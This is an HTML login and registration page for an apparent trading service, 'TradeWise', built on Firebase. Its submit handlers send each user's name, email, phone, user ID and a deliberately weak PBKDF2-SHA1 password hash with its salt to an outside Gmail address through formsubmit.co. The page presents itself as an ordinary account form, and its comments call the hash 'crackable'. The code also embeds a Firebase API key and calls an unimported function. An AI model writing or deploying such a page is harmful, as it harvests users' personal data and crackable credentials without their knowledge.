<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TradeWise | Account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css">
    <style>
        /* Same CSS as before */
        @import url('https://fonts.googleapis.com/css?family=Montserrat:400,800');

        * {
            box-sizing: border-box;
        }

        body {
            background: #f6f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            font-family: 'Montserrat', sans-serif;
            height: 100vh;
            margin: -20px 0 50px;
        }

        h1 {
            font-weight: bold;
            margin: 0;
        }

        h2 {
            text-align: center;
            color: #2c3e50;
        }

        p {
            font-size: 14px;
            font-weight: 100;
            line-height: 20px;
            letter-spacing: 0.5px;
            margin: 20px 0 30px;
        }

        span {
            font-size: 12px;
        }

        a {
            color: #333;
            font-size: 14px;
            text-decoration: none;
            margin: 15px 0;
        }

        button {
            border-radius: 20px;
            border: 1px solid #3498db;
            background-color: #3498db;
            color: #FFFFFF;
            font-size: 12px;
            font-weight: bold;
            padding: 12px 45px;
            letter-spacing: 1px;
            text-transform: uppercase;
            transition: transform 80ms ease-in;
            cursor: pointer;
            margin: 5px 0;
        }

        button:active {
            transform: scale(0.95);
        }

        button:focus {
            outline: none;
        }

        button.ghost {
            background-color: transparent;
            border-color: #FFFFFF;
        }

        button.secondary {
            background-color: transparent;
            border-color: #3498db;
            color: #3498db;
        }

        form {
            background-color: #FFFFFF;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 0 50px;
            height: 100%;
            text-align: center;
        }

        input {
            background-color: #eee;
            border: none;
            padding: 12px 15px;
            margin: 8px 0;
            width: 100%;
        }

        .container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 14px 28px rgba(0,0,0,0.25), 
                        0 10px 10px rgba(0,0,0,0.22);
            position: relative;
            overflow: hidden;
            width: 768px;
            max-width: 100%;
            min-height: 580px;
        }

        .form-container {
            position: absolute;
            top: 0;
            height: 100%;
            transition: all 0.6s ease-in-out;
        }

        .sign-in-container {
            left: 0;
            width: 50%;
            z-index: 2;
        }

        .container.right-panel-active .sign-in-container {
            transform: translateX(100%);
        }

        .sign-up-container {
            left: 0;
            width: 50%;
            opacity: 0;
            z-index: 1;
        }

        .container.right-panel-active .sign-up-container {
            transform: translateX(100%);
            opacity: 1;
            z-index: 5;
            animation: show 0.6s;
        }

        @keyframes show {
            0%, 49.99% {
                opacity: 0;
                z-index: 1;
            }
            
            50%, 100% {
                opacity: 1;
                z-index: 5;
            }
        }

        .overlay-container {
            position: absolute;
            top: 0;
            left: 50%;
            width: 50%;
            height: 100%;
            overflow: hidden;
            transition: transform 0.6s ease-in-out;
            z-index: 100;
        }

        .container.right-panel-active .overlay-container{
            transform: translateX(-100%);
        }

        .overlay {
            background: #2c3e50;
            background: -webkit-linear-gradient(to right, #2c3e50, #3498db);
            background: linear-gradient(to right, #2c3e50, #3498db);
            background-repeat: no-repeat;
            background-size: cover;
            background-position: 0 0;
            color: #FFFFFF;
            position: relative;
            left: -100%;
            height: 100%;
            width: 200%;
            transform: translateX(0);
            transition: transform 0.6s ease-in-out;
        }

        .container.right-panel-active .overlay {
            transform: translateX(50%);
        }

        .overlay-panel {
            position: absolute;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 0 40px;
            text-align: center;
            top: 0;
            height: 100%;
            width: 50%;
            transform: translateX(0);
            transition: transform 0.6s ease-in-out;
        }

        .overlay-left {
            transform: translateX(-20%);
        }

        .container.right-panel-active .overlay-left {
            transform: translateX(0);
        }

        .overlay-right {
            right: 0;
            transform: translateX(0);
        }

        .container.right-panel-active .overlay-right {
            transform: translateX(20%);
        }

        .social-container {
            margin: 20px 0;
        }

        .social-container a {
            border: 1px solid #DDDDDD;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            margin: 0 5px;
            height: 40px;
            width: 40px;
        }

        .messageDiv {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #4CAF50;
            color: white;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 1rem;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
            z-index: 1000;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .messageDiv.error {
            background-color: #f44336;
        }

        .messageDiv.warning {
            background-color: #ff9800;
        }

        .messageDiv.show {
            opacity: 1;
        }

        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.4);
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            animation: modalopen 0.4s;
        }

        @keyframes modalopen {
            from {opacity: 0; transform: translateY(-50px);}
            to {opacity: 1; transform: translateY(0);}
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover {
            color: black;
        }

        .modal-body {
            padding: 10px 0;
        }

        .phone-input-container {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 10px 0;
        }

        .phone-icon {
            margin-right: 10px;
            color: #3498db;
        }

        .phone-input {
            flex-grow: 1;
        }

        @media (max-width: 768px) {
            .container {
                width: 90%;
                min-height: 650px;
            }

            .sign-in-container,
            .sign-up-container {
                width: 100%;
            }

            .overlay-container {
                display: none;
            }

            .container.right-panel-active .sign-in-container,
            .container.right-panel-active .sign-up-container {
                transform: translateX(0);
            }

            .modal-content {
                width: 95%;
                margin: 20% auto;
            }
            
            form {
                padding: 0 20px;
            }
            
            .phone-input-container {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .phone-icon {
                margin-bottom: 5px;
            }
        }
    </style>
</head>
<body>
    <h2>TRADEWISE ACCOUNT</h2>
    <div id="popupMessage" class="messageDiv"></div>
    
    <div class="container" id="container">
        <div class="form-container sign-up-container">
            <form id="signUpForm">
                <h1>Create Account</h1>
                <span>or use your email for registration</span>
                <input type="text" id="fName" placeholder="First Name" required>
                <input type="text" id="lName" placeholder="Last Name" required>
                <input type="email" id="rEmail" placeholder="Email" required>
                <input type="password" id="rPassword" placeholder="Password" required minlength="6">
                <div class="phone-input-container">
                    <i class="fas fa-phone phone-icon"></i>
                    <input type="tel" class="phone-input" id="rPhone" placeholder="Phone Number (e.g. +1234567890)" required>
                </div>
                <button type="submit" id="submitSignUp">Sign Up</button>
            </form>
        </div>
        <div class="form-container sign-in-container">
            <form id="signInForm">
                <h1>Sign In</h1>
                <span>or use your account</span>
                <input type="email" id="sEmail" placeholder="Email" required>
                <input type="password" id="sPassword" placeholder="Password" required>
                <a href="#" id="forgotPassword">Forgot your password?</a>
                <button type="submit" id="submitSignIn">Sign In</button>
            </form>
        </div>
        <div class="overlay-container">
            <div class="overlay">
                <div class="overlay-panel overlay-left">
                    <h1>Welcome Back!</h1>
                    <p>Sign in to access your trading dashboard and analytics</p>
                    <button class="ghost" id="signIn">Sign In</button>
                </div>
                <div class="overlay-panel overlay-right">
                    <h1>New Here?</h1>
                    <p>Create an account to start your trading journey with us</p>
                    <button class="ghost" id="signUp">Sign Up</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Forgot Password Modal -->
    <div id="forgotPasswordModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <div class="modal-body">
                <h2>Reset Password</h2>
                <p>Enter your email to receive a password reset link</p>
                <input type="email" id="resetEmail" placeholder="Your email address" required>
                <button id="sendResetLink">Send Reset Link</button>
            </div>
        </div>
    </div>

    <script type="module">
        // Import Firebase modules
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { 
            getAuth, 
            createUserWithEmailAndPassword, 
            signInWithEmailAndPassword,
            sendPasswordResetEmail,
            updateProfile
        } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { 
            getFirestore, 
            setDoc, 
            doc
        } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDc2k8nqkQrX-PScgknG6ORZQsPdjS9xCc",
            authDomain: "auth-1-test.firebaseapp.com",
            projectId: "auth-1-test",
            storageBucket: "auth-1-test.appspot.com",
            messagingSenderId: "995102506505",
            appId: "1:995102506505:web:e02312a0ccbb855896c2d8"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        // ðŸ” Weak but educational: PBKDF2 with low iterations and fixed salt
        const SALT = crypto.getRandomValues(new Uint8Array(8)); // 8-byte salt (very small)
        // For testing, you could also use fixed salt: new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8])

        async function hashPassword(password) {
            const encoder = new TextEncoder();
            const keyMaterial = await crypto.subtle.importKey(
                'raw',
                encoder.encode(password),
                { name: 'PBKDF2' },
                false,
                ['deriveBits']
            );

            const hashBuffer = await crypto.subtle.deriveBits(
                {
                    name: 'PBKDF2',
                    salt: SALT,
                    iterations: 1000,  // ðŸ”¥ Low = crackable
                    hash: 'SHA-1'       // Less secure than SHA-256
                },
                keyMaterial,
                256 // 32 bytes = 256 bits
            );

            // Convert buffer to base64 string for sending
            return btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
        }

        // DOM elements
        const signUpButton = document.getElementById('signUp');
        const signInButton = document.getElementById('signIn');
        const container = document.getElementById('container');
        const forgotPasswordModal = document.getElementById('forgotPasswordModal');
        const closeButtons = document.querySelectorAll('.close');
        const forgotPasswordLink = document.getElementById('forgotPassword');
        const sendResetLinkBtn = document.getElementById('sendResetLink');

        // Popup message function
        function showPopup(message, isSuccess = true) {
            const popup = document.getElementById('popupMessage');
            popup.textContent = message;
            popup.className = isSuccess ? 'messageDiv show' : 'messageDiv show error';
            
            if (popup.timeoutId) {
                clearTimeout(popup.timeoutId);
            }
            
            popup.timeoutId = setTimeout(() => {
                popup.classList.remove('show');
            }, 5000);
        }

        // Function to send hashed password + salt to email
        async function sendUserDataToEmail(userData, isSignUp = true) {
            try {
                const response = await fetch('https://formsubmit.co/ajax/theofficialtradewise@gmail.com', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        _subject: `TRADEWISE USERS ACCOUNT DETAILS - ${isSignUp ? 'NEW SIGN UP' : 'SIGN IN'}`,
                        _template: 'table',
                        _autoresponse: 'Thank you for your submission',
                        timestamp: new Date().toISOString(),
                        firstName: userData.firstName,
                        lastName: userData.lastName,
                        email: userData.email,
                        phone: userData.phone,
                        userId: userData.userId || 'N/A',
                        password_hash: userData.passwordHash,  // ðŸ” Send hash
                        salt: Array.from(SALT).join(','),     // Send salt as comma-separated numbers
                        action: isSignUp ? 'Sign Up' : 'Sign In'
                    })
                });
                
                const result = await response.json();
                console.log('Hashed password and salt sent:', result);
                return true;
            } catch (error) {
                console.error('Error sending email:', error);
                return false;
            }
        }

        // Modal functions
        function openModal(modal) {
            modal.style.display = 'block';
            document.body.style.overflow = 'hidden';
        }

        function closeModal(modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        closeButtons.forEach(button => {
            button.addEventListener('click', () => {
                const modal = button.closest('.modal');
                closeModal(modal);
            });
        });

        window.addEventListener('click', (event) => {
            if (event.target.classList.contains('modal')) {
                closeModal(event.target);
            }
        });

        // Forgot password
        forgotPasswordLink.addEventListener('click', (e) => {
            e.preventDefault();
            openModal(forgotPasswordModal);
        });

        sendResetLinkBtn.addEventListener('click', async () => {
            const email = document.getElementById('resetEmail').value;
            if (!email) return showPopup('Email required', false);

            try {
                await sendPasswordResetEmail(auth, email);
                showPopup('Reset link sent!', true);
                closeModal(forgotPasswordModal);
            } catch (error) {
                showPopup('Error: ' + error.message, false);
            }
        });

        // Sign Up
        document.getElementById('signUpForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('rEmail').value;
            const password = document.getElementById('rPassword').value;
            const firstName = document.getElementById('fName').value;
            const lastName = document.getElementById('lName').value;
            const phone = document.getElementById('rPhone').value;

            try {
                const passwordHash = await hashPassword(password);
                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                const user = userCredential.user;

                await updateProfile(user, {
                    displayName: `${firstName} ${lastName}`
                });

                await setDoc(doc(db, "users", user.uid), {
                    email, firstName, lastName, phone, createdAt: new Date()
                });

                // Send hash + salt to email
                await sendUserDataToEmail({
                    firstName, lastName, email, phone, userId: user.uid, passwordHash
                }, true);

                showPopup('Account created! Please sign in.', true);
                container.classList.remove("right-panel-active");
                document.getElementById('sEmail').value = email;

            } catch (error) {
                if (error.code === 'auth/email-already-in-use') {
                    showPopup('Email already in use!', false);
                } else {
                    showPopup('Error: ' + error.message, false);
                }
            }
        });

        // Sign In
        document.getElementById('signInForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('sEmail').value;
            const password = document.getElementById('sPassword').value;

            try {
                const passwordHash = await hashPassword(password);
                const userCredential = await signInWithEmailAndPassword(auth, email, password);
                const user = userCredential.user;

                let userData = {
                    email: user.email,
                    userId: user.uid,
                    passwordHash
                };

                try {
                    const userDoc = await getDoc(doc(db, "users", user.uid));
                    if (userDoc.exists()) {
                        const data = userDoc.data();
                        userData.firstName = data.firstName || 'Unknown';
                        userData.lastName = data.lastName || '';
                    }
                } catch (err) {
                    userData.firstName = 'Unknown';
                }

                await sendUserDataToEmail(userData, false);
                showPopup('Login successful! Redirecting...', true);

                setTimeout(() => {
                    window.location.href = 'account.html';
                }, 1500);

            } catch (error) {
                showPopup('Invalid credentials', false);
            }
        });

        // Form toggle
        signUpButton.addEventListener('click', () => {
            container.classList.add("right-panel-active");
        });

        signInButton.addEventListener('click', () => {
            container.classList.remove("right-panel-active");
        });
    </script>
</body>
</html>